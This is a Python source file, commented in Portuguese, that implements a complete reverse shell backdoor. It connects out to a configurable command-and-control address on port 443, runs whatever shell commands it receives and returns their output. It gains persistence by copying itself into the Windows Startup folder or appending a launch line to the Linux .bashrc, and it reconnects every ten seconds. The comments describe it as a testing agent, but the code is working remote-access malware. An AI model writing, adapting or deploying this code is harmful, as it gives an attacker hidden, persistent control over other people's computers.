import socket
import subprocess
import threading
import time
import os
import sys
import platform

# Configurações de Conexão (Altere para o IP do seu Termux ou servidor de testes)
ccip = "127.0.0.1" 
ccport = 443

def conn(ccip, ccport):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ccip, ccport))
        return client
    except Exception:
        return None

def autorun():
    """
    Executa rotinas de persistência baseadas no sistema operacional detectado.
    """
    sistema = platform.system().lower()
    arquivo_atual = os.path.abspath(sys.argv[0])
    nome_arquivo = os.path.basename(arquivo_atual)
    
    if "windows" in sistema:
        try:
            appdata = os.environ.get("APPDATA")
            if appdata:
                pasta_startup = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                caminho_destino = os.path.join(pasta_startup, nome_arquivo)
                
                if not os.path.exists(caminho_destino):
                    comando = f'copy "{arquivo_atual}" "{caminho_destino}"'
                    os.system(f'cmd.exe /c {comando}')
        except Exception:
            pass
            
    elif "linux" in sistema:
        try:
            # Identifica a pasta HOME (funciona na AWS e também no ambiente interno do Termux)
            home = os.environ.get("HOME")
            if home:
                # No Linux/Termux, uma forma comum de persistência local é o arquivo .bashrc
                bashrc_path = os.path.join(home, ".bashrc")
                
                # Comando que confere se o script já está listado para rodar no .bashrc
                linha_comando = f"python3 {arquivo_atual} &\n"
                
                # Se o arquivo .bashrc existir, verifica se já possui a linha para evitar duplicados
                ja_existe = False
                if os.path.exists(bashrc_path):
                    with open(bashrc_path, "r") as f:
                        if arquivo_atual in f.read():
                            ja_existe = True
                
                # Se não estiver lá, adiciona ao final do arquivo de inicialização
                if not ja_existe:
                    with open(bashrc_path, "a") as f:
                        f.write(f"\n# Inicializacao automatica do agente de testes\n{linha_comando}")
        except Exception:
            pass

def cmd(client, data):
    try:
        sistema = platform.system().lower()
        
        if "windows" in sistema:
            shell_exec = None  
            encoding_padrao = "cp850"
            prompt = "\nCMD> "
        else:
            shell_exec = "/bin/sh" if os.path.exists("/bin/sh") else "/system/bin/sh"
            encoding_padrao = "utf-8"
            prompt = "\nshell$ "

        proc = subprocess.Popen(
            data, 
            shell=True, 
            executable=shell_exec,
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = proc.communicate()
        output = stdout + stderr
        
        if not output:
            output = "\n"
            
        resposta = output.encode(encoding_padrao, errors='replace') + prompt.encode(encoding_padrao)
        client.send(resposta)
        
    except Exception as error:
        try:
            client.send(f"Erro ao executar: {str(error)}\n".encode())
        except:
            pass

def cli(client):
    try:
        sistema = platform.system().lower()
        msg_boas_vindas = f"Conexao Estabelecida! Sistema: {platform.system()} {platform.release()}\n> "
        client.send(msg_boas_vindas.encode('utf-8', errors='ignore'))
        
        while True:
            data = client.recv(4096).decode('utf-8', errors='ignore').strip()
            
            if not data:
                break
                
            if data.lower() == ":kill":
                client.send(b"Desconectando...\n")
                break
            
            t = threading.Thread(target=cmd, args=(client, data))
            t.start()
            
    except Exception:
        pass
    finally:
        try:
            client.close()
        except:
            pass

if __name__ == "__main__":
    autorun()
    
    while True:
        client = conn(ccip, ccport)
        if client:
            cli(client)
        else:
            time.sleep(10)
